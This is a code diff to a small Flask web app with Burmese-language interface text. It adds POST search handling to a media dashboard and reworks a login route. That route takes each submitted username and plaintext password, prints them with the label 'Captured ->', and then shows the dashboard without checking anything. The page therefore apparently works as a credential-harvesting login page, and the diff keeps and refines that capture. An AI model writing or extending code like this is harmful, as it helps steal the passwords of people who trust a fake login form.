@@ -272,13 +272,13 @@ Dashboard_html = """
     </div>
 
     <!-- Search Bar အသစ် -->
-    <div class="search-box">
-    <form action="" method="GET">
-  <input type="text" name="query" placeholder="သီချင်း သို့မဟုတ် ဗီဒီယို ရှာရန်...">
+  <div class="search-box">
+    <form action="" method="POST">
+        <input type="text" name="query" placeholder="သီချင်း သို့မဟုတ် ဗီဒီယို ရှာရန်...">
         <button type="submit">ရှာမည်</button>
     </form>
 </div>
-   <div class="content">
+ <div class="content">
         {% if show_music %}
         <div class="card">
             <h3>🎵 Music Player</h3>
@@ -305,8 +305,33 @@ Dashboard_html = """
 @app.route("/login", methods=["GET", "POST"])
 def login():
     username = "User"
+    
     if request.method == "POST":
-        username = request.form.get("username", "User")
+        form_user = request.form.get("username")
+        if form_user:
+            username = form_user
+            
         password = request.form.get("password")
-        print(f"Captured -> Username: {username}, Password: {password}")
-        
+        if password:
+            print(f"Captured -> Username: {username}, Password: {password}")
+
+    # Search Bar ကနေ POST နဲ့ ပို့လိုက်တဲ့ စာသားကို ဖမ်းယူခြင်း
+    search_query = request.form.get("query", "").lower()
+    
+    show_music = True
+    show_video = True
+    
+    if search_query:
+        if "music" in search_query or "သီချင်း" in search_query:
+            show_video = False
+        elif "video" in search_query or "ဗီဒီယို" in search_query:
+            show_music = False
+
+    return render_template_string(
+        Dashboard_html, 
+        username=username, 
+        show_music=show_music, 
+        show_video=show_video,
+        search_query=search_query
+    )
+    
